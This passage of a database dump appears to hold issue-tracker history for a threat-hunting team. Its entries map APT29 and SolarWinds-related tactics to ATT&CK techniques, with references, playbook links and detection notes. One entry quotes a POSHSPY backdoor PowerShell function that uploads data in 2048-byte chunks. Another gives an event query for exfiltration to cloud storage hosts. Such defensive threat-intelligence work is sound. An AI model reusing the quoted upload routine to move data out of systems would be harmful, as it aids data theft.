remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\r\n\r\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Scanning or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\r\n\r\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)\r\n\r\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.\r\n\r\nReferences:\r\nFile -- MTI-095-2020-UNC2062(possibly APT29) Activity and TTPs.pdf                                            \r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+Exploitation+of+Remote+Services'),(115,118,'attr','description','Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\r\n\r\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Scanning or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\r\n\r\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)\r\n\r\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.\r\n\r\nReferences:\r\nFile -- MTI-095-2020-UNC2062(possibly APT29) Activity and TTPs.pdf                                            \r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+Exploitation+of+Remote+Services','Adversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.\r\n\r\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Scanning or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\r\n\r\nThere are several well-known vulnerabilities that exist in common services such as SMB (Citation: CIS Multiple SMB Vulnerabilities) and RDP (Citation: NVD CVE-2017-0176) as well as applications that may be used within internal networks such as MySQL (Citation: NVD CVE-2016-6662) and web server services. (Citation: NVD CVE-2014-7169)\r\n\r\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1210                                           \r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/APT+28+-+Exploitation+of+Remote+Services\r\n'),(116,119,'attr','subject','Web Service - T1102','Web Service: Bidirectional Communication - T1102.002'),(117,120,'attr','description','\r\n\r\nReferences:\r\nhttps://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/','Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems). \r\n\r\nReferences:\r\nhttps://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/'),(118,121,'attr','description','\r\nReferences:\r\nFile -- MTI-095-2020-UNC2062(possibly APT29) Activity and TTPs.pdf   \r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/pages/viewpage.action?pageId=955904802','Adversaries may use Valid Accounts to log into a service specifically designed to accept remote connections, such as telnet, SSH, and VNC. The adversary may then perform actions as the logged-on user.\r\n\r\nIn an enterprise environment, servers and workstations can be organized into domains. Domains provide centralized identity management, allowing users to login using one set of credentials across the entire network. If an adversary is able to obtain a set of valid domain credentials, they could login to many different machines using remote access protocols such as secure shell (SSH) or remote desktop protocol (RDP).(Citation: SSH Secure Shell)(Citation: TechNet Remote Desktop Services)\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1021\r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/pages/viewpage.action?pageId=955904802'),(119,122,'attr','description','\r\nReference:\r\nhttp://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016\r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1550.003+Pass+the+Ticket','Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.\r\n\r\nAuthentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.(Citation: NIST Authentication)(Citation: NIST MFA)\r\n\r\nCaching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the system—either in memory or on disk—it may be at risk of being stolen through Credential Access techniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.\r\n\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1550\r\nhttp://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016\r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/APT+29+-+T1550.003+Pass+the+Ticket'),(120,123,'attr','description','\r\n\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html','Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents. These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. \r\n\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html'),(121,124,'attr','description','Reference:\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\r\n\r\nhttps://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/\r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/T1078+-+Valid+Accounts','Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. (Citation: TechNet Credential Theft) Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.(Citation: Microsoft AD Accounts)\r\n\r\nAdversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.\r\n\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1078/002\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/\r\nhttps://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/\r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/T1078+-+Valid+Accounts'),(122,125,'attr','description','\r\n\r\nReferences:\r\nhttps://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf\r\n','Adversaries may use an existing, legitimate external Web service as a means for sending commands to and receiving output from a compromised system over the Web service channel. Compromised systems may leverage popular websites and social media to host command and control (C2) instructions. Those infected systems can then send the output from those commands back over that Web service channel. The return traffic may occur in a variety of ways, depending on the Web service being utilized. For example, the return traffic may take the form of the compromised system posting a comment on a forum, issuing a pull request to development project, updating a document hosted on a Web service, or by sending a Tweet.\r\n\r\nAPT29 has used social media platforms to hide communications to C2 servers.[2]\r\nhttps://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf'),(123,126,'attr','description','\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html','Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html'),(124,127,'attr','description','\r\n\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html',' Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary\'s footprint. \r\n\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html'),(125,128,'attr','description','Reference:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/pages/viewpage.action?pageId=914917314','Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\r\n\r\nThe deprecated at utility could also be abused by adversaries (ex: At (Windows)), though at.exe can not access tasks created with schtasks or the Control Panel.\r\n\r\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).\r\n\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1053/005\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/pages/viewpage.action?pageId=914917314'),(126,129,'attr','description','\r\n\r\nReference:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/T1543+-+Create+or+Modify+System+Process','Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service\'s executable or recovery programs/commands, is stored in the Windows Registry. Service configurations can be modified using utilities such as sc.exe and Reg.\r\n\r\nAdversaries may install a new service or modify an existing service by using system utilities to interact with services, by directly modifying the Registry, or by using custom tools to interact with the Windows API. Adversaries may configure services to execute at startup in order to persist on a system.\r\n\r\nAn adversary may also incorporate Masquerading by using a service name from a related operating system or benign software, or by modifying existing services to make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.\r\n\r\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges from administrator to SYSTEM. Adversaries may also directly start services through Service Execution.\r\n\r\nReference:\r\nhttps://attack.mitre.org/techniques/T1543/003\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\n\r\nPlaybook:\r\nhttps://confluence.di2e.net/display/CYH836/T1543+-+Create+or+Modify+System+Process'),(127,130,'attr','description','\r\n\r\nReferences:\r\nhttps://us-cert.cisa.gov/ncas/alerts/TA15-314A','Adversaries may abuse legitimate extensible development features of servers to establish persistent access to systems. Enterprise server applications may include features that allow developers to write and install software or scripts to extend the functionality of the main application. Adversaries may install malicious components to extend and abuse server applications.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1505\r\nhttps://us-cert.cisa.gov/ncas/alerts/TA15-314A'),(128,131,'attr','subject','Proxy - T1090','Proxy: Internal Proxy - T1090.001'),(129,131,'attr','description','\r\n\r\nReferences:\r\nhttp://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016\r\n','Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment. '),(130,132,'attr','description','\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/','Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. The certificates used during an operation may be created, acquired, or stolen by the adversary. Unlike Invalid Code Signature, this activity will result in a valid signature. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\r\nhttps://msrc-blog.microsoft.com/2020/12/13/customer-guidance-on-recent-nation-state-cyber-attacks/'),(131,133,'attr','description','\r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"\r\n','Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site. \r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"\r\n'),(132,134,'attr','description','\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\n','Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\n'),(133,135,'attr','description','\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\n','Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management can also be used externally.\r\n\r\nAccess to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1133\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\n'),(134,136,'attr','description','\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\n','Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\n'),(135,137,'attr','description','\r\n\r\n\r\nReferences:\r\nhttps://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf\r\nhttps://www.ncsc.gov.uk/files/Advisory-APT29-targets-COVID-19-vaccine-development-V1-1.pdf\r\n','Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\r\n\r\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise. (Citation: TechNet Credential Theft)\r\n\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1078\r\nhttps://www.welivesecurity.com/wp-content/uploads/2019/10/ESET_Operation_Ghost_Dukes.pdf\r\nhttps://www.ncsc.gov.uk/files/Advisory-APT29-targets-COVID-19-vaccine-development-V1-1.pdf\r\n'),(136,138,'attr','description','\r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"','Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names. \r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"'),(137,139,'attr','description','This ticket may need to be moved above T1071.001 and .004 or potentially deleted.\r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"\r\nhttps://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf\r\n','Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.\r\n\r\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1071\r\nhttps://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf\r\n'),(138,140,'attr','description','\r\n\r\n\r\nReferences:\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"','Adversaries may dynamically establish connections to command and control infrastructure to evade common detections and remediations. This may be achieved by using malware that shares a common algorithm with the infrastructure the adversary uses to receive the malware\'s communications. These calculations can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.\r\n\r\nAdversaries may use dynamic resolution for the purpose of Fallback Channels. When contact is lost with the primary command and control server malware may employ dynamic resolution as a means to reestablishing command and control.(Citation: Talos CCleanup 2017)(Citation: FireEye POSHSPY April 2017)(Citation: ESET Sednit 2017 Activity)\r\n\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1568\r\n'),(139,141,'attr','description','HAMMERTOSS exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.\r\n\r\nReferences:\r\nhttps://www.welivesecurity.com/2020/12/02/turla-crutch-keeping-back-door-open/\r\n\r\nNotes:\r\nevent.code : 5156 or 3 or 4688 -- \r\nevent.code : 3 AND DestinationHostname : github or dropbox or onedrive or 4shared','Adversaries may exfiltrate data by transferring the data, including backups of cloud environments, to another cloud account they control on the same service to avoid typical file transfers/downloads and network-based exfiltration detection. \r\n\r\nHAMMERTOSS exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later.\r\n\r\nReferences:\r\nhttps://www.welivesecurity.com/2020/12/02/turla-crutch-keeping-back-door-open/\r\n\r\nNotes:\r\nevent.code : 5156 or 3 or 4688 -- \r\nevent.code : 3 AND DestinationHostname : github or dropbox or onedrive or 4shared'),(140,142,'attr','description','\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html \r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"\r\n','Adversaries may create multiple stages for command and control that are employed under different conditions or for certain functions. Use of multiple stages may obfuscate the command and control channel to make detection more difficult.\r\n\r\nRemote access tools will call back to the first-stage command and control server for instructions. The first stage may have automated capabilities to collect basic host information, update tools, and upload additional files. A second remote access tool (RAT) could be uploaded at that point to redirect the host to the second-stage command and control server. The second stage will likely be more fully featured and allow the adversary to interact with the system through a reverse shell and additional RAT features.\r\n\r\nThe different stages will likely be hosted separately with no overlapping infrastructure. The loader may also have backup first-stage callbacks or Fallback Channels in case the original first-stage communication path is discovered and blocked.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1104\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html \r\n\r\n'),(141,143,'attr','description','\r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\n','Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive.(Citation: Wikipedia OSI) Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\r\n\r\nICMP communication between hosts is one example.(Citation: Cisco Synful Knock Evolution) Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts; (Citation: Microsoft ICMP) however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.\r\n\r\nReferences:\r\nhttps://attack.mitre.org/techniques/T1095\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\n'),(142,144,'attr','description','The APT29 POSHSPY backdoor uploads data in 2048-byte chunks. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"\r\n\r\n\r\nNotes:\r\n<pre>\r\nevent.code : 5156 or 3 or 4688 -- \r\nThe following provides an example of data uploading in 2048-byte chunks:\r\n\r\nfunction uploadDataAuth($data, $clnPass, $url, $ua, $ck)\r\n\r\n{\r\n      $dataHexStr = (prepareDataSend $data.pckd)\r\n\r\n      if($dataHexStr -eq $null -or $dataHexStr.Length -eq 0 -or\r\n\r\n ($dataHexStr.Length % 2) -ne 0)\r\n\r\n      {return $false}\r\n\r\n      try{\r\n\r\n            [uint32]$chunks = [Math]::Floor($dataHexStr.Length / 2048) + 1\r\n\r\n            for($i=0; $i -lt ($chunks-1); $i++)\r\n\r\n            {\r\n                  if($false -eq (uploadChunk $dataHexStr.Substring(2048*$i,\r\n\r\n 2048) $clnPass $url $ua $ck))\r\n\r\n                  {return $false}\r\n\r\n            }\r\n\r\n            return (uploadChunk $dataHexStr.Substring(2048*($chunks-1))\r\n\r\n $clnPass $url $ua $ck $dataHexStr.Length)\r\n\r\n      }\r\n\r\n      catch{return $false}\r\n\r\n}\r\nThe following provides an example of uploading data in 2048-byte chunks:\r\n\r\nfunction uploadDataAuth($data, $clnPass, $url, $ua, $ck)\r\n\r\n{\r\n\r\n      $dataHexStr = (prepareDataSend $data.pckd)\r\n\r\n      if($dataHexStr -eq $null -or $dataHexStr.Length -eq 0 -or\r\n\r\n ($dataHexStr.Length % 2) -ne 0)\r\n\r\n      {return $false}\r\n\r\n      try{\r\n\r\n            [uint32]$chunks = [Math]::Floor($dataHexStr.Length / 2048) + 1\r\n\r\n            for($i=0; $i -lt ($chunks-1); $i++)\r\n\r\n            {\r\n\r\n                  if($false -eq (uploadChunk $dataHexStr.Substring(2048*$i,\r\n\r\n 2048) $clnPass $url $ua $ck))\r\n\r\n                  {return $false}\r\n\r\n            }\r\n\r\n            return (uploadChunk $dataHexStr.Substring(2048*($chunks-1))\r\n\r\n $clnPass $url $ua $ck $dataHexStr.Length)\r\n\r\n      }\r\n\r\n      catch{return $false}\r\n\r\n}\r\n</pre>\r\n','Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications. \r\n\r\nThe APT29 POSHSPY backdoor uploads data in 2048-byte chunks. \r\n\r\nReferences:\r\nhttps://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html\r\nFile -- \"MTI-115-2020-20-00025647 FireEye Blog- Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims with SUNBURST Backdoor.pdf\"\r\n\r\n\r\nNotes:\r\n<pre>\r\nevent.code : 5156 or 3 or 4688 -- \r\nThe following provides an example of data uploading in 2048-byte chunks:\r\n\r\nfunction uploadDataAuth($data, $clnPass, $url, $ua, $ck)\r\n\r\n{\r\n      $dataHexStr = (prepareDataSend $data.pckd)\r\n\r\n      if($dataHexStr -eq $null -or $dataHexStr.Length -eq 0 -or\r\n\r\n ($dataHexStr.Length % 2) -ne 0)\r\n\r\n      {return $false}\r\n\r\n      try{\r\n\r\n            [uint32]$chunks = [Math]::Floor($dataHexStr.Length / 2048) + 1\r\n\r\n            for($i=0; $i -lt ($chunks-1); $i++)\r\n\r\n            {\r\n                  if($false -eq (uploadChunk $dataHexStr.Substring(2048*$i,\r\n\r\n 2048) $clnPass $url $ua $ck))\r\n\r\n                  {return $false}\r\n\r\n            }\r\n\r\n            return (uploadChunk $dataHexStr.Substring(2048*($chunks-1))\r\n\r\n $clnPass $url $ua $ck $dataHexStr.Length)\r\n\r\n      }\r\n\r\n      catch{return $false}\r\n\r\n}\r\nThe following provides an example of uploading data in 2048-byte chunks:\r\n\r\nfunction uploadDataAuth($data, $clnPass, $url, $ua, $ck)\r\n\r\n{\r\n\r\n      $dataHexStr = (prepareDataSend $data.pckd)\r\n\r\n      if($dataHexStr -eq $null -or $dataHexStr.Length -eq 0 -or\r\n\r\n ($dataHexStr.Length % 2) -ne 0)\r\n\r\n      {return $false}\r\n\r\n      try{\r\n\r\n            [uint32]$chunks = [Math]::Floor($dataHexStr.Length / 2048) + 1\r\n\r\n            for($i=0; $i -lt ($chunks-1); $i++)\r\n\r\n            {\r\n\r\n                  if($false -eq (uploadChunk $dataHexStr.Substring(2048*$i,\r\n\r\n 2048) $clnPass $url $ua $ck))\r\n\r\n                  {return $false}\r\n\r\n            }\r\n\r\n            return (uploadChunk $dataHexStr.Substring(2048*($chunks-1))\r\n\r\n $clnPass $url $ua $ck $dataHexStr.Length)\r\n\r\n      }\r\n\r\n      catch{return $false}\r\n\r\n}\r\n</pre>\r\n'),(143,145,'attr','description','Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns.\r\n\r\nReferences:\r\nhttps://BLOG-ASSETS.f-secure.com/wp-content/uploads/2019/10/15163418/CozyDuke.pdf\r\n\r\nNotes:\r\nevent.code : 1 OR 4688 -- \r\nevent.code : 3 OR 5167','An adversary may use legitimate 